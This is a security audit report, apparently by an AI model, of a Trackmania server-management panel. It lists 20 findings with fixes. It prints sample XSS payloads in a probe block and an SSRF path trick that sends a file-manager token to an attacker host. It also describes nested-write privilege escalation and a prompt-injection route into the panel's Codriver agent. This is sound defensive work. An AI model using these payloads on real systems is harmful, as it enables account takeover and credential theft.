# Security audit (Claude) — 2026-10-11

**Follow-up:** [Verification against the updated code and fix status for all 20 findings](2026-10-11-claude-verification.md).

Audited revision: `8b483417` (branch `release`). This is an independent static review that ran alongside the Astra audit in [`../security-audit-2026-10-11.md`](../security-audit-2026-10-11.md). Each finding lists its overlap with Astra's IDs (`SEC-xx`). Findings marked **New** are not in the Astra report.

Scope: web panel (auth, Server Actions, GET routes, file-manager proxy, Codriver, Hetzner), GBX service (internal API, WebSockets, chat/manialink routing, plugin sandbox and HTTP egress), shared permission code, Prisma schema, Docker Compose and CI. Application code was not changed.

Method: source reading, plus small local probes. One probe ran `tmtags.parseTmTags` on hostile input. Another ran WHATWG `Request` URL parsing on file-manager URL concatenation. No live server, database or exploit run was involved, so impact is inferred from the code.

## Priorities

| Priority          | Meaning                                                                                                                         |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **P0 — Critical** | Exploitable by an outsider or a low-trust user and leads to full panel compromise. Fix immediately.                             |
| **P1 — High**     | Privilege escalation or tenant break-out by a delegated operator, or a revocation failure. Fix before trusting delegated roles. |
| **P2 — Medium**   | Secret exposure or integrity gaps that need a prerequisite or extra steps. Schedule next.                                       |
| **P3 — Low**      | Hardening, defense in depth, and issues that depend on the deployment.                                                          |

## Summary

**20 findings:** 1 P0, 3 P1, 4 P2, 12 P3. Of these, 16 are new and 4 overlap or extend Astra findings (CL-01, CL-08, CL-17, CL-18).

| ID    | Priority | Category                 | Finding                                                                                                             | Astra                       |
| ----- | -------- | ------------------------ | ------------------------------------------------------------------------------------------------------------------- | --------------------------- |
| CL-01 | P0       | Browser injection        | Player chat and map names render as raw HTML in the panel                                                           | SEC-01 (raised to P0)       |
| CL-02 | P1       | Authorization            | `users:edit` can grant super-admin, including to yourself                                                           | **New**                     |
| CL-03 | P1       | Authorization            | Chat-config action writes the raw client object into the server row; group admins can reach it                      | **New** (pattern of SEC-02) |
| CL-04 | P1       | Authentication / session | Deleting a user does not revoke access: the JWT callback recreates the account                                      | **New**                     |
| CL-05 | P2       | Secrets / SSRF           | The file-manager path is concatenated onto the URL, so a crafted `?path=` sends the bearer token to another host    | **New**                     |
| CL-06 | P2       | Audit integrity          | Audited users can delete audit logs, the scope includes member and public-group servers, and deletion is not logged | **New**                     |
| CL-07 | P2       | Secrets                  | XML-RPC SuperAdmin passwords and file-manager tokens are stored in plaintext                                        | **New**                     |
| CL-08 | P2       | Authorization            | The same raw-spread pattern appears in Hetzner project, group and server create/update                              | Extends SEC-02              |
| CL-09 | P3       | Browser injection        | The file download proxy passes the upstream `Content-Type`/`Disposition` through without `nosniff`                  | **New**                     |
| CL-10 | P3       | Information disclosure   | The session sends public-group servers' XML-RPC host, port and file-manager URL to every logged-in account          | **New**                     |
| CL-11 | P3       | Authorization            | An empty ID turns `servers:${id}:admin` into "admin of any server"                                                  | **New**                     |
| CL-12 | P3       | Authorization            | `lib/actions.ts` is a `"use server"` module, so the generic wrappers are exported as actions                        | **New**                     |
| CL-13 | P3       | Game server integrity    | Moderators can pass arbitrary filenames to Save/Load match settings, blacklist and guestlist                        | **New**                     |
| CL-14 | P3       | AI / prompt injection    | Codriver reads player- and TMX-controlled text, and some admin tools run without confirmation                       | **New**                     |
| CL-15 | P3       | Availability             | The JWT callback runs several DB queries on every session read                                                      | **New**                     |
| CL-16 | P3       | Network egress           | The plugin HTTP blocklist misses some IPv6 transition ranges                                                        | **New**                     |
| CL-17 | P3       | Deployment               | The example Compose file ships fixed DB passwords and unauthenticated Redis                                         | Partly SEC-15               |
| CL-18 | P3       | Supply chain / CI        | Actions are pinned to tags, Bun is `latest`, and deploy SSH skips host-key checks                                   | Partly SEC-14               |
| CL-19 | P3       | Availability             | `GET /api/users/by-logins` creates users and fans out to the Nadeo API                                              | **New**                     |
| CL-20 | P3       | Availability             | File-manager health checks and proxied calls have no timeouts                                                       | **New**                     |

---

## P0 — Critical

### CL-01 — Player chat and map names render as raw HTML in the panel

**Category:** Browser injection. **Overlap:** Astra SEC-01 rates this P1. This report raises it to P0. **Status:** Probe-confirmed.

**Location:** [`live-chat.tsx:102`](../../apps/web/src/components/live/live-chat.tsx#L102). The same sink appears in about 15 other `dangerouslySetInnerHTML={{ __html: parseTmTags(...) }}` call sites: map cards, records, TMX and Nadeo components.

**Issue:** `tmtags.parseTmTags` does not escape HTML and turns `$l[...]` into an `href` without filtering the scheme. Probe output:

```
parseTmTags('<img src=x onerror=alert(1)>')         -> <img src=x onerror=alert(1)>
parseTmTags('$l[javascript:alert(1)]click$l')       -> <a href='javascript:alert(1)' ...>
parseTmTags('$l[" onmouseover="alert(1)]x$l')       -> <a href='" onmouseover="alert(1)' ...>
```

**Impact:** Any Trackmania player who can type in a server's chat gets script execution in the browser of every operator watching the Live page. No panel account is needed. The same applies to anyone who controls a map name: a TMX upload, a club campaign, or a map file. The script runs as the operator and can call Server Actions, for example CL-02's `updateUser({admin: true})`, Hetzner SSH actions, or plugin installs. With a super-admin watching, that is a full panel takeover. That is why this report rates it above Astra's P1.

**Fix:** Escape all text first, then apply TM formatting. Allow only `http(s):` links and quote attributes. Alternatively, render the formatting to React elements instead of HTML. Add a CSP (`script-src 'self'`, no `unsafe-inline`) as a second layer.

---

## P1 — High

### CL-02 — `users:edit` can grant super-admin, including to yourself

**Category:** Authorization. **New.**

**Location:** [`users.ts:10-37`](../../apps/web/src/actions/database/users.ts#L10).

**Issue:** `updateUser` checks only `users:edit` and then writes `{...data, permissions}` to any user. `data.admin` is a normal form field. Nothing stops a caller from:

- setting `admin: true`, on themselves or anyone else;
- granting permissions they do not hold;
- editing or demoting existing super-admins;
- writing extra columns, because the TypeScript `Omit<>` is not enforced at runtime.

**Impact:** `users:edit` is meant as a delegable permission (it is listed in `routePermissions.admin.users.edit`). In practice it equals full super-admin. Through CL-01, any XSS against a `users:edit` holder becomes a full takeover.

**Fix:** Parse with a strict schema. Only super-admins may change `admin`. A non-admin may grant only permissions they hold, and may not edit their own permissions or edit admins. Audit before and after values.

### CL-03 — Chat-config action writes the raw client object into the server row; group admins can reach it

**Category:** Authorization / mass assignment. **New.** This is a separate entry point from SEC-02 and needs lower privileges.

**Location:** [`servers.ts:185-216`](../../apps/web/src/actions/database/servers.ts#L185) → [`chat-config.ts`](../../apps/web/src/lib/chat-config.ts) `saveChatConfig` → `db.servers.update({ data: config })`.

**Issue:** `updateServerChatConfig` allows `servers:id:admin` **or** `group:servers:id:admin`. It passes the caller's `chatConfig` object straight into Prisma `data`. The `Pick<Servers, ...>` type is not enforced at runtime.

**Impact:** The Admin of any group that contains the server can rewrite fields that `updateServer` reserves for direct server admins and `servers:edit`:

- `host`, `port`, `user`, `password`, which repoints the GBX service's XML-RPC connection;
- `filemanagerUrl`, so the stored file-manager token is sent to the attacker's host on the next health check or restart (see SEC-10);
- `deletedAt`;
- nested relation writes such as `userServers: { create: { userId, role: "Admin" } }` or `groupServers: { create: { groupId } }`. The first escalates to direct server Admin. The second attaches the server to another group the attacker controls.

**Fix:** Build `data` from an explicit allowlist of the eight chat fields after strict zod parsing. Apply the same rule to every action that spreads caller input into Prisma (CL-08).

### CL-04 — Deleting a user does not revoke access: the JWT callback recreates the account

**Category:** Authentication / session lifecycle. **New.**

**Location:** [`auth.ts:124-173`](../../apps/web/src/lib/auth.ts#L124), [`users.ts:40-60`](../../apps/web/src/actions/database/users.ts#L40).

**Issue:**

- The `jwt` callback runs on every session read and calls `getUserById(token.id)` (`findUniqueOrThrow`). If that throws for any reason, the `catch` calls `upsertUserAuth` with the login from the token, `authenticated: true`, `DEFAULT_PERMISSIONS`, and `admin = DEFAULT_ADMINS.includes(login)`.
- `deleteUserById` hard-deletes the row. The deleted user's next request recreates it, and their existing cookie stays valid with a new user ID. There is no disabled/banned flag and no session revocation.
- On a transient DB error (a timeout, or a failover), the `update` branch of the upsert overwrites an existing user's `admin` flag and custom `permissions` with the defaults. Admins can be silently demoted, or custom roles wiped.

**Impact:** Operators cannot remove a user's access. Deleting a compromised or hostile account only resets it to default permissions and any public groups. Database instability silently changes privileges.

**Fix:** Recreate the user only on the sign-in path (`user` present), and only when no row exists. On refresh, an error or a missing row should invalidate the session: throw, or return an empty token. Add a `disabledAt`/ban field that the sign-in and refresh paths check. Use soft deletion as `AGENTS.md` describes. Never overwrite `admin` or `permissions` from the auth callback.

---

## P2 — Medium

### CL-05 — The file-manager path is concatenated onto the URL, so a crafted `?path=` sends the bearer token to another host

**Category:** Secrets / SSRF. **New.** **Status:** URL parsing confirmed by probe.

**Location:** [`services/filemanager/index.ts:30,99`](../../apps/web/src/services/filemanager/index.ts#L30), [`actions/filemanager/index.ts:46`](../../apps/web/src/actions/filemanager/index.ts#L46), and the page [`server/[id]/files/page.tsx`](<../../apps/web/src/app/(gocontroller)/server/[id]/files/page.tsx>), which passes `searchParams.path` to `getRoute`.

**Issue:** The code builds `fileManager.url + path` and sends `Authorization: Bearer <filemanagerPassword>`. Nothing checks that `path` starts with `/`. When the stored URL ends in a hostname, for example `http://fm.example.com`, a path of `.attacker.tld/x` produces `http://fm.example.com.attacker.tld/x`. The probe confirmed that `Request` accepts this and targets the attacker's host. When the URL ends in a port, the same trick changes the port on the same host. `@`-userinfo tricks are rejected by `fetch`.

**Impact:** The files page renders server-side from a query parameter. A link such as `/server/<id>/files?path=.attacker.tld/` sent to any server admin is a one-click token exfiltration, because the `SameSite=Lax` cookie is sent on top-level GET. The token gives direct file-manager access outside the panel and its audit log.

**Fix:** Require `path` to start with `/`, reject `..` and `\`, and build URLs with `new URL(path, base)`. Then assert that `origin === new URL(base).origin` before sending credentials. Encode path segments, as `files.ts` `encodePath` already does.

### CL-06 — Audited users can delete audit logs, the scope includes member and public-group servers, and deletion is not logged

**Category:** Audit integrity. **New.** SEC-06 covers the _read_ scope.

**Location:** [`audit-logs.ts:9-90`](../../apps/web/src/actions/database/audit-logs.ts#L9).

**Issue:** The action is allowed for anyone holding `servers::admin`, `groups::admin`, `group:servers::admin` or `hetzner::admin`, meaning admin of _anything_. The deletable scope is then built from `session.user.servers` (every role, including Member) and from all group servers, which includes public groups. Deletion is a soft delete, but it is not itself audited.

**Impact:** Operators can erase the record of their own actions. They can also erase logs for servers where they are only a member, or which they see only through a public group. That undermines the audit trail that the other findings rely on for detection.

**Fix:** Make audit logs append-only for everyone except super-admins or `audit-logs:delete` holders. If tenant deletion is kept, scope it to resources where the caller is Admin, and write an audit entry for each deletion.

### CL-07 — XML-RPC SuperAdmin passwords and file-manager tokens are stored in plaintext

**Category:** Secrets at rest. **New.**

**Location:** `Servers.password` and `Servers.filemanagerPassword` in both Prisma schemas ([`mysql/schema.prisma:174-176`](../../packages/db/prisma/mysql/schema.prisma#L174)).

**Issue:** Hetzner tokens, SSH keys and Codriver API keys are encrypted (AES-GCM). The dedicated server's SuperAdmin password and the file-manager bearer token are stored as plain columns. These two credentials give the most direct control over game hosts.

**Impact:** A database dump, a backup leak (see `scripts/backup*` and `backups/`), or a read-only SQL injection elsewhere hands over control of every managed server.

**Fix:** Encrypt both with `encryptSecret`. The GBX service needs the same `SECRETS_KEY` to decrypt. Fail closed when the key is missing, as `secrets.ts` already does.

### CL-08 — The same raw-spread pattern appears in Hetzner project, group and server create/update

**Category:** Authorization / mass assignment. **Extends SEC-02.**

**Location:**

- [`hetzner-projects.ts:20-23, 64-71`](../../apps/web/src/actions/database/hetzner-projects.ts#L64) uses `...projectData` and is reachable by `hetzner:<id>:admin`.
- [`groups.ts`](../../apps/web/src/actions/database/groups.ts) `updateGroup` uses `...scalarFields` and is reachable by group Admin. It can, for example, flip `public: true` and expose the group's servers to every account.
- [`servers.ts`](../../apps/web/src/actions/database/servers.ts) `createServer` and `updateServer`.
- [`roles.ts`](../../apps/web/src/actions/database/roles.ts).

**Issue and impact:** Each action treats TypeScript `Omit<>`/`Partial<>` as validation. A tenant admin can write columns the form never shows, and nested relation writes. That breaks tenant boundaries in the same way SEC-02 describes.

**Fix:** Use one strict zod schema per action and build an explicit `data` object. Ban `...input` spreads into Prisma, for example with an ESLint rule.

---

## P3 — Low / hardening

### CL-09 — The file download proxy passes the upstream `Content-Type`/`Disposition` through without `nosniff`

**Location:** [`files/download/route.ts:53-59`](../../apps/web/src/app/api/servers/[serverId]/files/download/route.ts#L53). **New.**

The route returns the file manager's `Content-Type`, and `Content-Disposition` falls back to an empty string, from the panel origin. If the file manager returns `text/html` or `image/svg+xml` without `attachment`, an uploaded HTML or SVG file renders as panel-origin script. A server admin could do this to a super-admin. **Fix:** Always send `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, and send `application/octet-stream` unless the type is on an allowlist.

### CL-10 — The session sends public-group servers' XML-RPC host, port and file-manager URL to every logged-in account

**Location:** [`auth.ts:119, 236-246`](../../apps/web/src/lib/auth.ts#L236), [`server-only/auth.ts`](../../apps/web/src/actions/database/server-only/auth.ts) `getPublicGroupsWithServers`, and the WS `servers` channel. **New.**

Login is open to any Trackmania account. Every public group's servers, with `host`, `port` (the XML-RPC endpoint) and `filemanagerUrl`, end up in the JWT and in `/api/auth/session`. **Fix:** Put only `{id, name}` in the token. Fetch addresses on demand, and only for admins.

### CL-11 — An empty ID turns `servers:${id}:admin` into "admin of any server"

**Location:** [`utils.ts:328`](../../apps/web/src/lib/utils.ts#L328), [`permissions.ts`](../../packages/shared/src/permissions.ts) `hasPermission`. **New.**

`"servers::admin"` is granted to anyone who is admin of _any_ server. A call with `serverId = ""`, or a template-built `servers:${""}:admin`, therefore passes. Today the downstream query finds nothing, but this is a latent bypass. **Fix:** Reject empty or invalid IDs in `withAuth`/`hasPermission` when a permission contains `:id` or `::`. Validate IDs with zod at every action entry.

### CL-12 — `lib/actions.ts` is a `"use server"` module, so the generic wrappers are exported as actions

**Location:** [`lib/actions.ts:1`](../../apps/web/src/lib/actions.ts#L1). **New.**

`doServerAction` and `doServerActionWithAuth(roles, action)` are helpers, but the file directive makes them callable Server Action endpoints wherever Next registers them. They are not exploitable as written, because functions can't be supplied from the client except as other action references. **Fix:** Remove `"use server"` and use `import "server-only"`.

### CL-13 — Moderators can pass arbitrary filenames to Save/Load match settings, blacklist and guestlist

**Location:** [`actions/gbx/game.ts`](../../apps/web/src/actions/gbx/game.ts) (`saveMatchSettings`, `appendPlaylist`, `insertPlaylist`) and [`actions/gbx/player.ts`](../../apps/web/src/actions/gbx/player.ts) (`load/saveBlacklist`, `load/saveGuestlist`). **New.**

Moderator-level actions forward any filename to the dedicated server. At minimum, a moderator can overwrite existing playlists and lists. Whether the dedicated server accepts `../` was **not verified**. **Fix:** Validate filenames against `^[\w\-. /]+\.(txt|xml)$`, reject `..`, and consider making save operations admin-only.

### CL-14 — Codriver reads player- and TMX-controlled text, and some admin tools run without confirmation

**Location:** [`lib/codriver/tools/plugins.ts:74,221`](../../apps/web/src/lib/codriver/tools/plugins.ts#L74) (`set_plugin_enabled`, `reload_plugins`) and [`tools/match.ts`](../../apps/web/src/lib/codriver/tools/match.ts) (`run_plugin_command`). **New.**

Role checks and confirmation re-checks are solid. Tool results still feed attacker-controlled text into the model: player names, chat, TMX map names and plugin metadata. Some mutating admin tools run without a confirmation step, so a prompt injection during an admin's request could toggle plugins or run plugin commands. **Fix:** Require confirmation for every state-changing tool. Wrap untrusted strings in clearly delimited data blocks in tool results.

### CL-15 — The JWT callback runs several DB queries on every session read

**Location:** [`auth.ts:128-252`](../../apps/web/src/lib/auth.ts#L128). **New.**

Each `auth()` call reloads the user with all groups and servers, every public group, and, for admins, _every group with members_. API routes and actions often call `auth()` twice (`withAuth` → `hasPermission` + `auth`). This load grows with tenants and requests. **Fix:** Cache per request (React `cache`) and/or keep a short-lived Redis permission cache invalidated on membership changes. Fixing CL-04 is a good moment to restructure this.

### CL-16 — The plugin HTTP blocklist misses some IPv6 transition ranges

**Location:** [`plugin-http-client.ts:28-35`](../../apps/gbx-service/src/infra/http/plugin-http-client.ts#L28). **New.**

The design is good: DNS-pinned lookup, https only, no IP literals. The IPv6 list does not include `64:ff9b::/96` (NAT64), `2002::/16` (6to4) or `fec0::/10`. These can reach internal IPv4 on hosts with NAT64/6to4. Plugins can also override the `Host` header through `input.headers`. **Fix:** Add those ranges, or decode embedded IPv4 and re-check it. Strip `host` and hop-by-hop headers.

### CL-17 — The example Compose file ships fixed DB passwords and unauthenticated Redis

**Location:** [`docker-compose.yml`](../../docker-compose.yml). **Partly SEC-15.**

The file has `MARIADB_PASSWORD: VettePanel123` and `MARIADB_ROOT_PASSWORD: password_whatever`, Redis has no `requirepass`, and the GBX service publishes `3100` on all interfaces. Anything on the Docker network can publish to the Redis server-events channel that the GBX service trusts. **Fix:** Use `${VAR:?}` placeholders with no defaults, and enable Redis auth. Bind `3100` behind the reverse proxy, or split the WS and internal ports.

### CL-18 — Actions are pinned to tags, Bun is `latest`, and deploy SSH skips host-key checks

**Location:** [`.github/workflows/`](../../.github/workflows). **Partly SEC-14.**

`actions/checkout@v3`, `docker/login-action@v2`, `oven-sh/setup-bun@v1` and `bun-version: latest` are mutable references in workflows that hold Docker Hub and production SSH secrets. `deploy-production.yml` runs `ssh-keyscan` and then `StrictHostKeyChecking=no`. **Fix:** Pin actions to commit SHAs and pin the Bun version. Store the production host key as a secret `known_hosts` entry.

### CL-19 — `GET /api/users/by-logins` creates users and fans out to the Nadeo API

**Location:** [`services/database/users.ts`](../../apps/web/src/services/database/users.ts) `getUsersByLogins`. **New.**

The GET route writes rows and calls the Nadeo API for every unknown login, with an unbounded list. Any group or server admin can drive it. **Fix:** Cap the list size, rate-limit, and move the creation into an explicit action.

### CL-20 — File-manager health checks and proxied calls have no timeouts

**Location:** [`managers/file-manager.ts`](../../apps/web/src/lib/managers/file-manager.ts) and every `fetch(fileManager.url…)`. **New.**

Every file operation first makes an untimed health request, and a slow or black-holed file manager holds request workers indefinitely. `getFileManager` also ignores `deletedAt`. **Fix:** Add `AbortSignal.timeout(...)` to all file-manager calls. Cache health briefly, and scope lookups to non-deleted servers.

---

## Astra findings re-checked

These Astra findings were confirmed independently in source during this review: SEC-01 (as CL-01), SEC-02 (the `...rest` spread in `updateServer`), SEC-03 (unchecked `groupServers[].serverId`), SEC-10 (`updateFileManager` sends the existing password to the new URL), SEC-11 (Handlebars, which HTML-escapes rather than shell-escapes, renders `.sh.hbs` scripts), SEC-12 (`HETZNER_KEY` defaults to `""`, and `decryptHetznerToken` returns the ciphertext on failure), SEC-14 (no `hostVerifier` in `lib/ssh.ts`) and SEC-17 (`bodySizeLimit: "1gb"`). The remaining Astra findings were not re-verified here and are not disputed.

## Areas that held up

- **Plugin sandbox:** QuickJS runs in its own WASM instance per plugin, with memory, stack, CPU-deadline and per-minute budgets. Values cross the boundary only as JSON. GBX methods are allowlisted per capability, and manialink IDs are namespaced.
- **Plugin HTTP egress:** https only, no IP literals, and a DNS lookup pinned at connect time to stop rebinding. Only the small gaps in CL-16 remain.
- **Service-to-service auth:** Bearer tokens are compared with `timingSafeEqual`, secrets must be at least 32 characters, and the service fails to start without them.
- **WebSocket tickets:** HS256 with issuer and audience, 60 s TTL, single use (JTI replay set), per-channel authorization, and connection rate limiting.
- **Marketplace:** Packages are fetched from the index origin only, with size limits and sha256 checks. Manifest, slug, version and capabilities are cross-checked, and first-party slugs are protected.
- **Codriver:** Roles are resolved server-side from the login, `minRole` is enforced per tool, roles are re-checked when a confirmed call runs, and budgets and cooldowns apply. The in-game window escapes ManiaScript strings properly.
- **GET API layer:** Sort fields are restricted by regex, page size is capped, and `Cache-Control: private, no-store` is set.

## Suggested order of work

1. **CL-01** (escape TM text and add a CSP). It is the entry point that turns every other authorization bug into a remote attack.
2. **CL-02, CL-03, CL-08 with SEC-02/03:** a single pass replacing every Prisma spread with strict schemas, plus delegation ceilings on `users:edit`.
3. **CL-04:** fix session revocation and the auth-callback upsert.
4. **CL-05, CL-07, with SEC-10:** file-manager credential handling (origin check, encryption at rest, no secret forwarding on URL change).
5. **CL-06:** make the audit log append-only. Then the P3 hardening items.
